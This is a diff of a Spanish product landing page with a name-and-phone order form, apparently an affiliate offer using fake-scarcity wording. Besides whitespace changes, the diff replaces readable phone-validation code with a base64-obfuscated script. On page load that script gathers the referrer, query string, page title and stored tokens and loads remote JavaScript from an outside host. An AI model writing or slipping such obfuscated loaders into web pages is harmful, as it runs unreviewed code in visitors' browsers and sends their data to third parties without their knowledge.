@@ -32,20 +32,20 @@
           <div class="new-cost">Precio de hoy: <strong class="productsum">49 euro</strong> </div>
         </div>
         <form class="m1-form order-form" method="post" geo="es" action="api.php" 
-	onsubmit="return validate_form(this, 'Por favor ingrese un número de teléfono válido');">		
+  onsubmit="return validate_form(this, 'Por favor ingrese un número de teléfono válido');">   
           <div>
             <input name="name" value="" placeholder="Introduzca su nombre" required="" type="text">
           </div>
           <div>
             <input name="phone" value="" placeholder="Introduzca su teléfono" required="" type="tel">
           </div>
-			<div class="reolader">
-				<button class="mm_button button-m">ORDENE AHORA</button>
-			</div>
-			<input name="subid" type="hidden" value="{subid}">
-			<input name="flow_id" type="hidden" value="{flow_id}">
-			<input name="pixel" type="hidden" value="{pixel}">
-			<input name="user_id" type="hidden" value="{user_id}">
+      <div class="reolader">
+        <button class="mm_button button-m">ORDENE AHORA</button>
+      </div>
+      <input name="subid" type="hidden" value="{subid}">
+      <input name="flow_id" type="hidden" value="{flow_id}">
+      <input name="pixel" type="hidden" value="{pixel}">
+      <input name="user_id" type="hidden" value="{user_id}">
         </form>
         <div class="main-reminder">Artículos que quedan en stock: <span>13</span></div>
       </div>
@@ -54,10 +54,10 @@
 </section>
 
 <section class="copyright"> 
-	<p style="font-size: small;">ForestLeaf, Calle de Ayala, 17, 28001 Madrid, Spain
-		<br><a href="/privacypolicy" target="_blank">Privacy policy</a> 
-	<a href="/general-conditions-of-sale" target="_blank">General conditions of sale</a> 
-	  <a href="https://www.amazon.com/Vegan-Omega-Supplement-Alternative-Sustainably/dp/B07RH7N1MC" target="_blank">Legal warning</a>
+  <p style="font-size: small;">ForestLeaf, Calle de Ayala, 17, 28001 Madrid, Spain
+    <br><a href="/privacypolicy" target="_blank">Privacy policy</a> 
+  <a href="/general-conditions-of-sale" target="_blank">General conditions of sale</a> 
+    <a href="https://www.amazon.com/Vegan-Omega-Supplement-Alternative-Sustainably/dp/B07RH7N1MC" target="_blank">Legal warning</a>
 </section>
 <link rel="stylesheet" type="text/css" href="fonts/roboto.css">
 
@@ -66,86 +66,6 @@
 
 <script type="text/javascript" src="/libs/js/gdpr.js"></script>
 <link rel="stylesheet" href="/libs/js/gdpr.css">
-<script>
-    var phonePattern = {
-            'ru': '+7 (___) ___-__-__',
-            'ua': '+38-___-___-__-__',
-            'by': '+375 ___ ___ ___',
-            'kz': '+7 ___ ___ ____',
-            'kg': '+___ ___ __ __ __',
-            'md': '0 ___ _____',
-            'az': '+___-__-___-__-__',
-            'ge': '+995 ___ __ __ __',
-            'es': '+34 ___ __ __ __',
-            'it': '+39-___-___-____',
-            'esp': '+34 ___ __ __ __',
-            'pt': '+351 ___ ___ ___',
-            'prt': '+351 ___ ___ ___',
-            'id': '+62 ___ ___ ___',
-            'gr': '+30 ___ _______',
-            'cy': '+357 __ ______',
-            'ro': '+40 ___ ___ ___? _',
-            'bg': '+359 ___ __ ___? _',
-            'cz': '+420 ___ ___ ___',
-            'sk': '+421 ___ ___ ___'
-            /* --- */
-        },
-        forms = document.getElementsByClassName('order-form'),
-        inputs = [];
-    for(let form of forms)
-        inputs.push(form.querySelector('input[name="phone"]'));
-
-    //функция на проверку соответствия количества введенных в инпут символов, количеству необходимых в маске
-    function validate_form(form, alert_text = "Please enter valid phone number") {
-        var input_ln = form.querySelector('input[name="phone"]').value.replace(/ /g, '').length,
-            pattern_ln = phonePattern[form.getAttribute('geo')].replace(/\?| /g, '').length;
-        if (input_ln>=pattern_ln) return true;
-        else { alert(alert_text); return false;}
-    }
-
-    //сама маска, срабатывающая от ивентов ввода, фокуса, потери фокуса и нажатия кнопки мыши
-    document.addEventListener("DOMContentLoaded", function() {
-
-        function mask(event) {
-
-            var input = event.currentTarget,
-                geo = input.form.getAttribute('geo'),
-                matrix = phonePattern[geo],
-                i = 0,
-                def = matrix.replace(/\D/g, ""),
-                val = input.value.replace(/\D/g, "");
-            if (def.length >= val.length) val = def;
-            if (!(/_|\?|-|\(\)/.test(matrix[input.selectionStart])))
-                input.selectionStart = input.value.length;
-
-            input.value = matrix.replace(/./g, function (a) {
-                return /[_|?\d]/.test(a) && i < val.length ? val.charAt(i++) : i >= val.length ? "" : a
-            });
-            if (event.type == "blur") {
-                if (input.value.length == 2) input.value = ""
-            }
-        };
-
-        for (const input of inputs) {
-            input.addEventListener("input", (e) => mask(e), false);
-            input.addEventListener("focus", (e) => mask(e), false);
-            input.addEventListener("blur", (e) => mask(e), false);
-            input.addEventListener("mouseup", (e) => mask(e), false);
-        }
-    });
-
-    $(document).ready(function () {
-        // Load GDPR
-        $(document).gdprCookieLaw({
-            moreLinkHref: '/privacypolicy',
-            theme: 'theme-1',
-            position: 'bottom-right',
-            width: '760px',
-            margin: '15px',
-            animation: 'fade-slide',
-            btnAcceptText: 'Ok'
-        });
-    });
-</script>
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfRDdUTDE3TFRtV0hIN1RwRic7CiAgICBpZiAoIXdpbmRvdy5fRDdUTDE3TFRtV0hIN1RwRikgewogICAgICAgIHdpbmRvdy5fRDdUTDE3TFRtV0hIN1RwRiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9sZWdnci5qYW5hdGFuLmNvbS8xWnh4eTInLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL2xlZ2dyLmphbmF0YW4uY29tLzg4MzE4ZTQvcG9zdGJhY2snLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfWWRnY3pZdHNIZkJ2UXg4NSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX1lkZ2N6WXRzSGZCdlF4ODUgIT09ICd1bmRlZmluZWQnICYmIF9ZZGdjell0c0hmQnZReDg1ICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9XV3YzZjZNQ3FnWGZmVDJOID0gSlNPTi5wYXJzZShfWWRnY3pZdHNIZkJ2UXg4NSk7CiAgICAgICAgdmFyIF90czVCYzZQZkszY3dGTUhIID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX1dXdjNmNk1DcWdYZmZUMk4uY3JlYXRlZF9hdCArIHdpbmRvdy5fRDdUTDE3TFRtV0hIN1RwRi50dGwgPCBfdHM1QmM2UGZLM2N3Rk1ISCkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3Zzc1d4UDZSNWt0WkdieXcgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfTTNMRnExa1libjFXOVhOeSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9rM3pXWFdXOFJ2RDJLR25HID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfazN6V1hXVzhSdkQyS0duRyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfazN6V1hXVzhSdkQyS0duRyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9rM3pXWFdXOFJ2RDJLR25HICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9rM3pXWFdXOFJ2RDJLR25HICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfazN6V1hXVzhSdkQyS0duRyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgIGlmICh0eXBlb2YgX3Zzc1d4UDZSNWt0WkdieXcgIT09ICd1bmRlZmluZWQnICYmIF92c3NXeFA2UjVrdFpHYnl3ICYmIHdpbmRvdy5fRDdUTDE3TFRtV0hIN1RwRi51bmlxdWUpIHsKICAgICAgICBfazN6V1hXVzhSdkQyS0duRyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF92c3NXeFA2UjVrdFpHYnl3KTsKICAgIH0KICAgIGlmICh0eXBlb2YgX00zTEZxMWtZYm4xVzlYTnkgIT09ICd1bmRlZmluZWQnICYmIF9NM0xGcTFrWWJuMVc5WE55ICYmIHdpbmRvdy5fRDdUTDE3TFRtV0hIN1RwRi51bmlxdWUpIHsKICAgICAgICBfazN6V1hXVzhSdkQyS0duRyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX00zTEZxMWtZYm4xVzlYTnkpOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX0Q3VEwxN0xUbVdISDdUcEYuUl9QQVRIICsgX2szeldYV1c4UnZEMktHbkc7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
 
 </html>
